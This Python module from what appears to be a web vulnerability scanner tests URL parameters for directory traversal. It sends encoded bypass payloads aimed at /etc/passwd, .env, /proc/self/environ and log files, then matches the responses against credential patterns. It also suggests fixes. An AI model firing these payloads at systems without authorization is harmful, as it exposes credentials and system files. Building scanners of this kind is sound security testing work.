from __future__ import annotations

import re
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import requests

from .base import BaseScanModule, Finding

# Target files that confirm traversal (CBBH 16: Key Files to Target)
TRAVERSAL_TARGETS = [
    ("/etc/passwd", [r"root:.*:0:0:", r"daemon:.*:/usr/sbin", r"nobody:"]),
    ("/.env", [r"APP_KEY=", r"DB_PASSWORD=", r"SECRET_KEY=", r"API_KEY="]),
    ("/var/www/html/config.php", [r"\$db", r"password", r"DB_PASS"]),
    ("/var/log/apache2/access.log", [r"GET /", r"HTTP/1\."]),
    ("/proc/self/environ", [r"PATH=", r"HOME=", r"USER="]),
]

# Encoding bypass variants (CBBH 16: Basic Bypasses)
TRAVERSAL_PREFIXES = [
    "../../../../",
    "....//....//....//....//",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f",
    "..%2F..%2F..%2F..%2F",
    "..%252F..%252F..%252F..%252F",  # double-encoded
]


class TraversalScanner(BaseScanModule):
    name = "traversal"
    description = "Test directory traversal with encoding bypass variants against path parameters"

    def run(self, url: str) -> list[Finding]:
        findings: list[Finding] = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        if not params:
            findings.append(Finding(
                check="Directory Traversal",
                result="INFO",
                severity="Info",
                evidence=f"No query parameters in {url} to test for traversal.",
            ))
            return findings

        found = False
        for param in params:
            for target_path, success_patterns in TRAVERSAL_TARGETS:
                for prefix in TRAVERSAL_PREFIXES:
                    payload = prefix + target_path.lstrip("/")
                    test_url = self._build_url(parsed, params, param, payload)
                    result = self._probe(test_url, param, payload, target_path, success_patterns)
                    if result:
                        findings.append(result)
                        found = True
                        break
                if found:
                    break

        if not findings:
            findings.append(Finding(
                check="Directory Traversal",
                result="SECURE",
                severity="Info",
                evidence="No traversal to sensitive files detected.",
            ))

        return findings

    def _build_url(self, parsed, params: dict, param: str, payload: str) -> str:
        new_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
        new_params[param] = payload
        return urlunparse(parsed._replace(query=urlencode(new_params)))

    def _probe(self, test_url, param, payload, target_path, patterns) -> Finding | None:
        try:
            resp = requests.get(test_url, timeout=self.timeout, verify=False,
                                allow_redirects=True)
            for pattern in patterns:
                if re.search(pattern, resp.text, re.IGNORECASE):
                    return Finding(
                        check="Directory Traversal",
                        result="VULNERABLE",
                        severity="Critical",
                        evidence=f"Parameter '{param}' leaked {target_path} with payload: {payload}",
                        detail=(
                            f"Directory traversal confirmed -- {target_path} contents returned. "
                            "Attacker reads credentials, API keys, and log files. "
                            "Log file access enables log poisoning → RCE. "
                            "Fix (CBBH): use basename() to strip paths from user input; "
                            "never pass user input to file functions; "
                            "set open_basedir in php.ini to restrict file access to /var/www."
                        ),
                        raw_request=f"GET {test_url}",
                        raw_response=resp.text[:400],
                    )
        except requests.RequestException:
            pass
        return None
